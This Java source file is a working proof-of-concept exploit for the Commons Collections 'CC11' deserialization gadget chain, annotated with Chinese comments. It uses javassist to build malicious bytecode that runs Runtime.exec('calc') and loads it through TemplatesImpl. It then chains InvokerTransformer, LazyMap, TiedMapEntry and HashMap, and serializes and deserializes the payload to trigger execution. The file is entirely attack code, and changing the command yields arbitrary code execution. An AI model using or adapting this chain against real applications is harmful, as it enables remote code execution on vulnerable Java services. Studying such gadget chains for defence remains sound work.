import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.CannotCompileException;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.NotFoundException;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class cc11 {
    public static void main(String[] args) throws NoSuchFieldException, CannotCompileException, NotFoundException, IOException, IllegalAccessException, ClassNotFoundException {
        /*构造恶意字节码*/
        ClassPool classPool = ClassPool.getDefault();
        CtClass cc = classPool.makeClass("Evil");
        String cmd = "java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);//
        cc.setName("Leihehe");
        cc.setSuperclass(classPool.get(AbstractTranslet.class.getName()));//
        byte[] evilbytes = cc.toBytecode();//恶意字节码

        /*配置TemplatesImpl - 加载恶意class到jvm*/
        TemplatesImpl templates = new TemplatesImpl();
        Field bytecodes = templates.getClass().getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates,new byte[][]{evilbytes});//这里传入的evilbytes需要在byte[][]中
        Field name = templates.getClass().getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates,"LeiHello");
        Field tfactory = templates.getClass().getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templates,new TransformerFactoryImpl());
        //任意方法调用templates.newTransformer()或者templates.getOutputProperties即可触发

        /*构造invokerTransformer来调用newTransformer()方法*/
        InvokerTransformer invokerTransformer = new InvokerTransformer("getClass",null,null);

        Map map = new HashMap();
        Map lazyMap = LazyMap.decorate(map, invokerTransformer);//需要把lazyMap中我们之前加入的没用的map给移除

        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,templates);

        /*利用HashMap反序列化中的hash(key)方法，触发利用链*/
        HashMap hashMap = new HashMap();
        hashMap.put(tiedMapEntry,"helloWorld");

        lazyMap.clear();
        Field iMethodName = invokerTransformer.getClass().getDeclaredField("iMethodName");
        iMethodName.setAccessible(true);
        iMethodName.set(invokerTransformer,"newTransformer");

        ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("1.ser"));
        outputStream.writeObject(hashMap);
        outputStream.close();

        ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("1.ser"));
        inputStream.readObject();
    }
}
